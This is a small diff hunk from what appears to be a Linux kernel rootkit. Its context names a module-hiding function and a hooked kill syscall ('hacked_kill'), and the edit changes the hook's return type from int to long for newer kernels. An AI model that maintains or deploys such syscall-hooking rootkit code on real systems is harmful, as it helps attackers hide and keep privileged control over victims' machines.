@@ -332,7 +332,7 @@ module_hide(void)
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
-asmlinkage int
+asmlinkage long
 hacked_kill(const struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
